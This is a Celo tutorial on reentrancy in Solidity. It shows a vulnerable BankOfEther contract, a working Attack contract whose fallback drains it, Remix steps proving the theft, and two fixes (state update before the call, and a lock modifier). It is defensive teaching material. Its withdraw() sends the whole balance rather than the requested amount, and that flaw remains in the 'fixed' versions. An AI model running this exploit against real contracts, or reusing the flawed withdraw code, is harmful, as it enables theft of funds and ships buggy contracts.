---
title: Preventing Vulnerabilities in Solidity - Reentrancy Attack
description: In Solidity, reentrancy describes a scenario in which a contract calls a second contract. The second contract then calls the first contract while the first contract is still running.
authors:
  - name: Oyeniyi Abiola Peace
    title: Community Moderator, Celo
    url: https://github.com/iamoracle
    image_url: https://github.com/iamoracle.png
tags: [vulnerability, security, Celo Sage]
hide_table_of_contents: true
slug: /tutorials/preventing-vulnerabilities-in-solidity-reentrancy-attack
---

![header](../../src/data-tutorials/showcase/intermediate/preventing-vulnerabilities-in-solidity-reentrancy-attack.png)

## Introduction

To continue our previous articles on the vulnerabilities of Solidity and how to prevent them, we will dive into the reentrancy attack. We will look at code examples and devise solutions to avoid reentrancy.

## Prerequisites

To properly understand this guide, you must have a solid knowledge of creating smart contracts with Solidity. The link below will come in handy:

https://docs.celo.org/blog/tutorials/solidity-from-zero-to-hero

## Requirements

To code along with this guide, you must set up a text editor or an IDE like [Remix IDE](https://remix.ethereum.org).

## What Is Reentrancy Attack?

In Solidity, reentrancy describes a scenario in which a contract calls a second contract. The second contract then calls the first contract while the first contract is still running. 

For better comprehension, reentrancy means that contract A can call contract B, but while contract A is still executing the call, contract B calls contract A. This behavior will cause the program to go into an infinite loop, ultimately making the contract run out of [gas](https://solidity-by-example.org/gas/).

An attacker can use reentrancy to perform various malicious actions, such as transferring all of the funds in a contract to the attacker's account or modifying the contract's state in unexpected ways.

For better understanding, let us cite an example:

1. `Contract A` has 20 ETH in it. It also keeps a record of how many ETH it owes other contracts. Right now, it owes `contract B` 1 ETH.
2. `Contract B` has zero ETH right now.
3. `Contract A` has a function called `payDebt()` inside it. This function will check that the caller's balance exceeds zero, then send the amount owed. Finally, it will reset the caller's balance to zero. This way, it can repay `contract B` and still have 19 ETH left.
4. `Contract B` has two functions in it. The functions are `attack()` and `fallback()`. Both functions call the `A.payDebt()` function.
5. First, `contract B` calls `B.attack()`. The call to `B.attack()` will automatically call `A.payDebt()`.
6. `A.payDebt()` executes sequentially and sends the owed balance before resetting it. When it sends the balance initially, it triggers the `fallback()` function inside `contract B` which then calls the `payDebt()` function again.
7. Since `contract A` had yet not reset the balance, `contract A` still has a record that it owes `contract B` 1 ETH. Thus, it will keep sending ETH to `contract B`.
8. `Contract A` continually sends ETH because the function sends the owed amount before resetting it to zero. And the amount is never reset because sending the owed amount triggers another call to the `payDebt()` function. Therefore, for every payment made to `contract B`, `contract A` gets called to make another payment.

## Code Demo to Explain Reentrancy Attack in Solidity

In this code demo, we have a contract called BankOfEther. This contract allows other contracts to store and withdraw ETH from it.


    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.17;
    
    contract BankOfEther {
        mapping(address => uint) public balances;
    
        function deposit() public payable {
            balances[msg.sender] += msg.value;
        }
    
        function withdraw(uint _amount) public {
            uint bal = balances[msg.sender];
            require(bal >= _amount);
    
            (bool sent, ) = msg.sender.call{value: bal}(""); //send the ether
            require(sent, "Failed to send Ether");
    
            balances[msg.sender] = bal - _amount; //update balances
        }
    
        // Helper function to check the balance of this contract
        function getBalance() public view returns (uint) {
            return address(this).balance;
        }
    }

From the code snippet above, users can store their ETH by calling the `deposit()` function. This function will update the internal balance inside the mapping called `balances`.


    mapping(address => uint) public balances; //to keep track of the balances across accounts.
    
    //deposit function. It updates the balances.
    function deposit() public payable {
        balances[msg.sender] += msg.value; //updates balances
    }

Users can also withdraw their ETH by calling the `withdraw()` function. This function has a variable called `bal`. The value of `bal` is `balances[msg.sender]`, i.e., the user's balance. It will then check that the user has enough ETH stored in the contract to make a withdrawal. If the user does, it will send the requested ETH to the necessary contract. After this, the function will update `balances`. The function takes a parameter. This parameter is the amount for withdrawal.


        function withdraw(uint _amount) public {
            uint bal = balances[msg.sender]; //create variable to hold balances
            require(bal >= _amount); //check that there is enough ether to make a withdrawal
    
            (bool sent, ) = msg.sender.call{value: bal}(""); //send the ether
            require(sent, "Failed to send Ether");
    
            balances[msg.sender] = bal - _amount; //update balances
        }

In the code, we also have a helper function that we will use to get the contract’s balance. It is called getBalance().


        // Helper function to check the balance of this contract
        function getBalance() public view returns (uint) {
            return address(this).balance;
        }

Let us consider an example of a contract that can carry out the reentrancy attack on `BankOfEther`. Let’s call it `Attack`:


    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.17;
    
    contract Attack {
        BankOfEther public bankOfEther;
    
        constructor(address _bankOfEtherAddress) {
            bankOfEther = BankOfEther(_bankOfEtherAddress);
        }
    
        // Fallback is called when BankOfEther sends Ether to this contract.
        fallback() external payable {
            if (address(bankOfEther).balance >= 1 ether) {
                bankOfEther.withdraw(1 ether);
            }
        }
    
        function attack() external payable {
            require(msg.value >= 1 ether);
            bankOfEther.deposit{value: 1 ether}();
            bankOfEther.withdraw(1 ether);
        }
    
        // Helper function to check the balance of this contract
        function getBalance() public view returns (uint) {
            return address(this).balance;
        }
    }

The `Attack` contract first stores the target contract, `BankOfEther` in a state variable called `bankOfEther`. The address of the `bankOfEther` variable is passed as an argument when the `Attack` contract is deployed.


    BankOfEther public bankOfEther; //set target exploit
    
    constructor(address _bankOfEtherAddress) {
        bankOfEther = BankOfEther(_bankOfEtherAddress); //update the address of the target to BankOfEther
    }

To successfully perform the exploit, the `Attack()` contract must have two functions. They are:

1. The `attack()` function. It initiates the attack.
2. The `fallback()` function.

We deposit 1 ETH into the `BankOfEther` in the `attack()` function. Immediately after this, we withdraw the 1 ETH that was deposited.


    
        function attack() external payable {
            require(msg.value >= 1 ether); //check that there is enough ether to perform withdrawal
            bankOfEther.deposit{value: 1 ether}(); //deposit 1 ether
            bankOfEther.withdraw(1 ether); //withdraw the 1 ether back
        }

When we withdraw the 1 ETH back, it triggers the `withdraw()` function in the `BankOfEther` contract. The `withdraw()` function will call the `fallback()` function in the `Attack` contract. This call is because it sends 1 ETH back to the `Attack` contract. Let us take a look at the `fallbak()` function:


        fallback() external payable {
            if (address(bankOfEther).balance >= 1 ether) { //check if BankOfEther has more than 0 ether
                bankOfEther.withdraw(1 ether); //withdraw ether
            }
        }

We call the `withdraw()` function again inside the `fallback()` function.  The code checks if `BankOfEther` has more than 0 ETH in it and then withdraws if the condition is true. Like in the BankOfEther contract, we have a getBalance() function here. It does the same thing as BankOfEther.getBalance()

Let us have a look at how our `BankOfEther` contract gets exploited.


1. First, let us compile our contracts.
![Compile code.](./images/1.png)

2. Next, we will deploy the `BankOfEther` contract. We should see the deployed contract at the bottom. Let’s copy the contract’s address from there.
![Deploy BankOfEther's contract, then copy its address.](./images/2.png)

3. The next step will be to deploy the `Attack` contract. Before we deploy, we need to paste the address of `BankOfEther` as an argument.
![Paste BankOfEther's address, then deploy  contract.](./images/3.png)

4. Next, we have to deposit some ether into `BankOfEther`. We can use multiple accounts, but we will stick to one in this example. We will do this twice. Then we will check the current balance by calling the `getbalance()` function. We should have 4 ETH.
![Select an account to use then deposit 2 ETH. Do this twice](./images/4.png)

![Click on deposit() then getBalance()](./images/5.png)

5. Now that we have confirmed 4 ETH, let us test the attack. To do this, we will switch accounts. We also need to call `Attack.attack()` and send 1 ETH. Before we do this, we should check the current balance in the `Attack` contract.
![Switch accounts](./images/6.png)

![Check the balance of the Attack contract. It is currently 0 ETH.](./images/7.png)

![Prepare to send 1 ETH](./images/8.png)

![Call the attack() function.](./images/9.png)

6. Finally, let us check the balances of the two contracts.
![BankOfEther now has 0 ETH while  the Attack contract has 5 ETH. The exploit is complete](./images/10.png)


`BankOfEther` now has 0 ETH while `Attack` contract has 5 ETH. The exploit is complete.


As previously demonstrated, the `BankOfEther` contract is vulnerable to reentry because, the balance of the `Attack` contract is not updated. As soon as the `withdraw()` function sends 1 ETH to the `Attack()` contract, the `fallback()` function is called. Since the `fallback()` function also calls the `withdraw()` function, the balance of the `Attack` contract will not be updated. Because the balance still needs to be updated, `BankOfEther` still believes that `Attack` has 1 ETH in its possession. Hence, the `Attack` contract can make withdrawals multiple times.

## How to Prevent Reentrancy Attack in Solidity

We can use two techniques to prevent the reentrancy attack on our Solidity smart contracts. Let us explore these:

1. The first technique to prevent the attacking is by updating the state variable before making a call to external contracts. Let us consider the `BankOfEther` contract:


    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.17;
    
    contract BankOfEther {
        mapping(address => uint) public balances;
    
        function deposit() public payable {
            balances[msg.sender] += msg.value;
        }
    
        function withdraw(uint _amount) public {
            uint bal = balances[msg.sender];
            require(bal >= _amount);
    
            (bool sent, ) = msg.sender.call{value: bal}(""); //send the ETH
            require(sent, "Failed to send Ether");
    
            balances[msg.sender] = bal - _amount; //update balances
        }
    
        // Helper function to check the balance of this contract
        function getBalance() public view returns (uint) {
            return address(this).balance;
        }
    }

In the `withdraw()` function, the state variable that holds the balances of different accounts is the last thing that is updated. This means that nothing is deducted from external accounts until after ETH has been sent out, i.e.,  the external contracts have been called.
If a second call is made from an external contract before its balance is updated, it can easily withdraw an amount that it does not own. Because of this, the `BankOfether` contract should be modified as follows:


    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.17;
    
    contract BankOfEther {
        mapping(address => uint) public balances;
    
        function deposit() public payable {
            balances[msg.sender] += msg.value;
        }
    
        function withdraw(uint _amount) public {
            uint bal = balances[msg.sender];
            require(bal >= _amount);//al
    
            balances[msg.sender] = bal - _amount; //update balances before sending ether
    
            (bool sent, ) = msg.sender.call{value: bal}(""); //send the ether
            require(sent, "Failed to send Ether");
        }
    
        // Helper function to check the balance of this contract
        function getBalance() public view returns (uint) {
            return address(this).balance;
        }
    }

With the above code, if `Attack()` makes another call, it won’t be able to withdraw anything because its balance would have been updated to zero.

1. The second technique to prevent reentrancy is by using a modifier called a Reentrancy Guard. 
    The idea is to lock the contract while a function is executed so that only a single function can be executed at a time. Let us look at the modifier:
    
     bool internal locked; //state variable to lock the contract
    
        modifier noReentrant() {
            require(!locked, "No re-entrancy"); //check that the contrack is not locked
            locked = true; //lock the state variable
            _; //execute the function
            locked = false; //set locked to be false
        }


1. First, we need a state variable to lock an unlock the contract whenever necessary.
2. Inside the modifier `noReentrant()`, we check that the contract is not locked. If this passes, we lock the contract by setting `locked` to true.
3. After that, the necessary function is executed.
4. After the function gets executed, `locked` is set to false.

To use this modifier, we need to add it to the `withdraw()` function. Let’s modify the `BankOfEther`contract as well.


    contract BankOfEther {
        mapping(address => uint) public balances;
    
            //deposit function
        function deposit() public payable {
            balances[msg.sender] += msg.value;
        }
                    
                    bool internal locked;
                    
            //reentrancy guard
        modifier noReentrant() {
            require(!locked, "No re-entrancy");
            locked = true;
            _;
            locked = false;
        }
    
            //withdraw function
        function withdraw(uint _amount) public noReentrant{//add modifier to withdraw function
            uint bal = balances[msg.sender];
            require(bal >= _amount);//al
    
            (bool sent, ) = msg.sender.call{value: bal}(""); //send the ether
            require(sent, "Failed to send Ether");
    
            balances[msg.sender] = bal - _amount; //update balances
        }
    
        // Helper function to check the balance of this contract
        function getBalance() public view returns (uint) {
            return address(this).balance;
        }
    }

With the modifications made to the contract, whenever the `withdraw()` function is called, it will call the `noReentrant()` modifier. This modifier will set the `locked` state variable to true. Then, the `withdraw()` function will be executed.
Whenever the `fallback()` function tries to call the `withdraw()` function again, the `noReentrant()`modifier will firstly check if `locked` is false. But since the `withdraw()` function is still executing, `locked` is going to be true. This will make the transaction fail.

## Conclusion

The Reentrancy attack is very common in Solidity. It is always a good idea to protect your code by following best practices and guides on preventing such attacks. For more information about the reentrancy attack, [read this article](https://www.alchemy.com/overviews/reentrancy-attack-solidity#:~:text=What is a reentrancy attack in Solidity%3F&text=A reentrancy attack in Solidity repeatedly withdraws funds from a,find an exploitable smart contract). Remember to give your code multiple checks to avoid unfortunate events.


## References

- [OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts)
- [Solidity vulnerabilities](https://blog.sigmaprime.io/solidity-security.html)
- [Remix IDE](http://remix.ethereum.org/)

## Author

[Oyeniyi Abiola Peace](https://twitter.com/_iamoracle) is a seasoned software and blockchain developer. With a degree in Telecommunication Science from the University of Ilorin and over five years experience in JavaScript, Python, PHP, and Solidity, he is no stranger to the tech industry. Peace currently works as the CTO at DFMLab and is a Community Moderator at Celo Blockchain. When he's not coding or teaching, he loves to read and spend time with family and friends.